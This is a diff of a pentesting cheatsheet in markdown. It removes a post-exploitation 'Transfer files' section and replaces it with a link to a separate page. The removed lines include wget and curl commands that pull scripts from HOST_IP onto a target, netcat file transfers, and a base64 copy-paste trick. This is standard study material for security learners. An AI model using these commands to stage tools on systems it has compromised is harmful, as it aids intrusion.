@@ -203,69 +203,7 @@ The [Game of Active Directory (GOAD)](https://github.com/Orange-Cyberdefense/GOA
 
 ## Transfer files 🛅
 
-<div class="row row-cols-lg-2"><div>
-
-You will often want to transfer files between your machine, and the target. Mostly during privilege escalation and post-exploitation.
-
-➡️ See also: [Windows File Transfer Cheatsheet](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/) and [croc](https://github.com/schollz/croc).
-
-#### Python webserver 🐍
-
-<i class="small">On the "host" where the file is:</i>
-
-```shell!
-$ python -m http.server port # port > 1023
-$ python [...] --directory /path/to/server/root
-$ sudo python -m http.server port # port <= 1023
-```
-
-<i class="small">On the "client" that need the file:</i>
-
-```shell!
-$ # Download on Linux
-$ wget HOST_IP:port/script.sh -o /tmp/script.sh
-PS> # Download on Windows
-PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
-```
-
-* You may try with `python2`, and `python3` if `python` is unavailable.
-* You may have to use `curl` or `iws` (Windows-only) instead of `wget`
-
-```shell!
-$ curl HOST_IP:port/script.sh -o /tmp/script.sh
-PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
-PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
-```
-</div><div>
-
-#### netcat 🐈
-
-```ps
-# host
-$ nc CLIENT_IP port < file.sh
-# client
-$ nc -lvp port > file.sh
-```
-
-<br>
-
-#### services 🕳️
-
-You may use FTP/SCP/NFS/SMB/... if applicable. For instance, you may set up a [SMB](/operating-systems/networking/protocols/smb.md) server on your machine,  and use Windows `copy`/`robocopy ` command to upload/download files.
-
-```shell!
-$ php -S 127.0.0.1:8080 # php
-$ http-server -p 8080   # node "http-server" package
-```
-
-➡️ See also [impacket](/operating-systems/networking/protocols/tools/impacket.md)
-
-<br>
-
-#### Copy-paste ✂️
-
-Copy-paste may be an option, but not every file can be copy-pasted. One trick is to encode the file using base64, copy-paste the base64 payload on a file on the target, and decode the file on the target.
-</div></div>
+Moved to a separate page: [Files Transfer](topics/files_transfer.md).
 
 <hr class="sep-both">
 
